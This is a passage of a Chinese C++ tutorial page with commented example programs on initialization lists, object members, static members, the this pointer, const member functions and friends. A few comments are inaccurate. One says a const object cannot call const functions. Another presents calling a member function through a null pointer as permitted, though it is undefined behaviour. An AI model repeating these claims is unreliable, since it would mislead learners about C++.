&#123;&#125;</span><br><span class="line">void PrintPerson() &#123;</span><br><span class="line">cout &lt;&lt; &quot;mA:&quot; &lt;&lt; m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;mB:&quot; &lt;&lt; m_B &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;mC:&quot; &lt;&lt; m_C &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">private:</span><br><span class="line">int m_A;</span><br><span class="line">int m_B;</span><br><span class="line">int m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">Person p(1, 2, 3);</span><br><span class="line">p.PrintPerson();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类对象作为类成员"><a href="#类对象作为类成员" class="headerlink" title="类对象作为类成员"></a>类对象作为类成员</h3><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    A a；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B类中有对象A作为成员，A为对象成员</p><p>那么当创建B对象时，A与B的构造和析构的顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">class Phone</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Phone(string name)</span><br><span class="line">&#123;</span><br><span class="line">m_PhoneName &#x3D; name;</span><br><span class="line">cout &lt;&lt; &quot;Phone构造&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~Phone()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Phone析构&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string m_PhoneName;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化列表可以告诉编译器调用哪一个构造函数</span><br><span class="line">Person(string name, string pName) :m_Name(name), m_Phone(pName)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Person构造&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Person析构&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void playGame()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; m_Name &lt;&lt; &quot; 使用&quot; &lt;&lt; m_Phone.m_PhoneName &lt;&lt; &quot; 牌手机! &quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string m_Name;</span><br><span class="line">Phone m_Phone;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;当类中成员是其他类对象时，我们称该成员为 对象成员</span><br><span class="line">&#x2F;&#x2F;构造的顺序是 ：先调用对象成员的构造，再调用本类构造</span><br><span class="line">&#x2F;&#x2F;析构顺序与构造相反</span><br><span class="line">Person p(&quot;张三&quot; , &quot;苹果X&quot;);</span><br><span class="line">p.playGame();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h3><p>静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员</p><p>静态成员分为：</p><ul><li>静态成员变量<ul><li>所有对象共享同一份数据</li><li>在编译阶段分配内存</li><li>类内声明，类外初始化</li></ul></li><li>静态成员函数<ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量</li></ul></li></ul><p><strong>示例1 ：</strong>静态成员变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">static int m_A; &#x2F;&#x2F;静态成员变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态成员变量特点：</span><br><span class="line">&#x2F;&#x2F;1 在编译阶段分配内存</span><br><span class="line">&#x2F;&#x2F;2 类内声明，类外初始化</span><br><span class="line">&#x2F;&#x2F;3 所有对象共享同一份数据</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">static int m_B; &#x2F;&#x2F;静态成员变量也是有访问权限的</span><br><span class="line">&#125;;</span><br><span class="line">int Person::m_A &#x3D; 10;</span><br><span class="line">int Person::m_B &#x3D; 10;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;静态成员变量两种访问方式</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1、通过对象</span><br><span class="line">Person p1;</span><br><span class="line">p1.m_A &#x3D; 100;</span><br><span class="line">cout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">Person p2;</span><br><span class="line">p2.m_A &#x3D; 200;</span><br><span class="line">cout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl; &#x2F;&#x2F;共享同一份数据</span><br><span class="line">cout &lt;&lt; &quot;p2.m_A &#x3D; &quot; &lt;&lt; p2.m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2、通过类名</span><br><span class="line">cout &lt;&lt; &quot;m_A &#x3D; &quot; &lt;&lt; Person::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;m_B &#x3D; &quot; &lt;&lt; Person::m_B &lt;&lt; endl; &#x2F;&#x2F;私有权限访问不到</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例2：</strong>静态成员函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态成员函数特点：</span><br><span class="line">&#x2F;&#x2F;1 程序共享一个函数</span><br><span class="line">&#x2F;&#x2F;2 静态成员函数只能访问静态成员变量</span><br><span class="line"></span><br><span class="line">static void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func调用&quot; &lt;&lt; endl;</span><br><span class="line">m_A &#x3D; 100;</span><br><span class="line">&#x2F;&#x2F;m_B &#x3D; 100; &#x2F;&#x2F;错误，不可以访问非静态成员变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int m_A; &#x2F;&#x2F;静态成员变量</span><br><span class="line">int m_B; &#x2F;&#x2F; </span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态成员函数也是有访问权限的</span><br><span class="line">static void func2()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func2调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">int Person::m_A &#x3D; 10;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;静态成员变量两种访问方式</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1、通过对象</span><br><span class="line">Person p1;</span><br><span class="line">p1.func();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2、通过类名</span><br><span class="line">Person::func();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Person::func2(); &#x2F;&#x2F;私有权限访问不到</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-对象模型和this指针"><a href="#C-对象模型和this指针" class="headerlink" title="C++对象模型和this指针"></a>C++对象模型和this指针</h2><h3 id="成员变量和成员函数分开存储"><a href="#成员变量和成员函数分开存储" class="headerlink" title="成员变量和成员函数分开存储"></a>成员变量和成员函数分开存储</h3><p>在C++中，类内的成员变量和成员函数分开存储</p><p>只有非静态成员变量才属于类的对象上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line">mA &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;非静态成员变量占对象空间</span><br><span class="line">int mA;</span><br><span class="line">&#x2F;&#x2F;静态成员变量不占对象空间</span><br><span class="line">static int mB; </span><br><span class="line">&#x2F;&#x2F;函数也不占对象空间，所有函数共享一个函数实例</span><br><span class="line">void func() &#123;</span><br><span class="line">cout &lt;&lt; &quot;mA:&quot; &lt;&lt; this-&gt;mA &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;静态成员函数也不占对象空间</span><br><span class="line">static void sfunc() &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; sizeof(Person) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="this指针概念"><a href="#this指针概念" class="headerlink" title="this指针概念"></a>this指针概念</h3><p>通过4.3.1我们知道在C++中成员变量和成员函数是分开存储的</p><p>每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p><p>那么问题是：这一块代码是如何区分那个对象调用自己的呢？</p><p>c++通过提供特殊的对象指针，this指针，解决上述问题。<strong>this指针指向被调用的成员函数所属的对象</strong></p><p>this指针是隐含每一个非静态成员函数内的一种指针</p><p>this指针不需要定义，直接使用即可</p><p>this指针的用途：</p><ul><li>当形参和成员变量同名时，可用this指针来区分</li><li>在类的非静态成员函数中返回对象本身，可使用return *this</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(int age)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;1、当形参和成员变量同名时，可用this指针来区分</span><br><span class="line">this-&gt;age &#x3D; age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person&amp; PersonAddPerson(Person p)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;age +&#x3D; p.age;</span><br><span class="line">&#x2F;&#x2F;返回对象本身</span><br><span class="line">return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person p1(10);</span><br><span class="line">cout &lt;&lt; &quot;p1.age &#x3D; &quot; &lt;&lt; p1.age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">Person p2(10);</span><br><span class="line">p2.PersonAddPerson(p1).PersonAddPerson(p1).PersonAddPerson(p1);</span><br><span class="line">cout &lt;&lt; &quot;p2.age &#x3D; &quot; &lt;&lt; p2.age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="空指针访问成员函数"><a href="#空指针访问成员函数" class="headerlink" title="空指针访问成员函数"></a>空指针访问成员函数</h3><p>C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针</p><p>如果用到this指针，需要加以判断保证代码的健壮性</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;空指针访问成员函数</span><br><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">void ShowClassName() &#123;</span><br><span class="line">cout &lt;&lt; &quot;我是Person类!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ShowPerson() &#123;</span><br><span class="line">if (this &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; mAge &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">int mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person * p &#x3D; NULL;</span><br><span class="line">p-&gt;ShowClassName(); &#x2F;&#x2F;空指针，可以调用成员函数</span><br><span class="line">p-&gt;ShowPerson();  &#x2F;&#x2F;但是如果成员函数中用到了this指针，就不可以了</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="const修饰成员函数"><a href="#const修饰成员函数" class="headerlink" title="const修饰成员函数"></a>const修饰成员函数</h3><p><strong>常函数：</strong></p><ul><li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li><li>常函数内不可以修改成员属性</li><li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li></ul><p><strong>常对象：</strong></p><ul><li>声明对象前加const称该对象为常对象</li><li>常对象只能调用常函数</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line">m_A &#x3D; 0;</span><br><span class="line">m_B &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;this指针的本质是一个指针常量，指针的指向不可修改</span><br><span class="line">&#x2F;&#x2F;如果想让指针指向的值也不可以修改，需要声明常函数</span><br><span class="line">void ShowPerson() const &#123;</span><br><span class="line">&#x2F;&#x2F;const Type* const pointer;</span><br><span class="line">&#x2F;&#x2F;this &#x3D; NULL; &#x2F;&#x2F;不能修改指针的指向 Person* const this;</span><br><span class="line">&#x2F;&#x2F;this-&gt;mA &#x3D; 100; &#x2F;&#x2F;但是this指针指向的对象的数据是可以修改的</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span><br><span class="line">this-&gt;m_B &#x3D; 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyFunc() const &#123;</span><br><span class="line">&#x2F;&#x2F;mA &#x3D; 10000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">mutable int m_B; &#x2F;&#x2F;可修改 可变的</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;const修饰对象  常对象</span><br><span class="line">void test01() &#123;</span><br><span class="line"></span><br><span class="line">const Person person; &#x2F;&#x2F;常量对象  </span><br><span class="line">cout &lt;&lt; person.m_A &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;person.mA &#x3D; 100; &#x2F;&#x2F;常对象不能修改成员变量的值,但是可以访问</span><br><span class="line">person.m_B &#x3D; 100; &#x2F;&#x2F;但是常对象可以修改mutable修饰成员变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;常对象访问成员函数</span><br><span class="line">person.MyFunc(); &#x2F;&#x2F;常对象不能调用const的函数</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>生活中你的家有客厅(Public)，有你的卧室(Private)</p><p>客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去</p><p>但是呢，你也可以允许你的好闺蜜好基友进去。</p><p>在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术</p><p>友元的目的就是让一个函数或者类 访问另一个类中私有成员</p><p>友元的关键字为 ==friend==</p><p>友元的三种实现</p><ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul><h3 id="全局函数做友元"><a href="#全局函数做友元" class="headerlink" title="全局函数做友元"></a>全局函数做友元</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Building</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span><br><span class="line">friend void goodGay(Building * building);</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;</span><br><span class="line">this-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">string m_SittingRoom; &#x2F;&#x2F;客厅</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">string m_BedRoom; &#x2F;&#x2F;卧室</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void goodGay(Building * building)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问： &quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问： &quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Building b;</span><br><span class="line">goodGay(&amp;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类做友元"><a href="#类做友元" class="headerlink" title="类做友元"></a>类做友元</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">class Building;</span><br><span class="line">class goodGay</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">goodGay();</span><br><span class="line">void visit();</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Building</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span><br><span class="line">friend class goodGay;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">Building();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">string m_SittingRoom; &#x2F;&#x2F;客厅</span><br><span class="line">private:</span><br><span class="line">string m_BedRoom;&#x2F;&#x2F;卧室</span><br><span 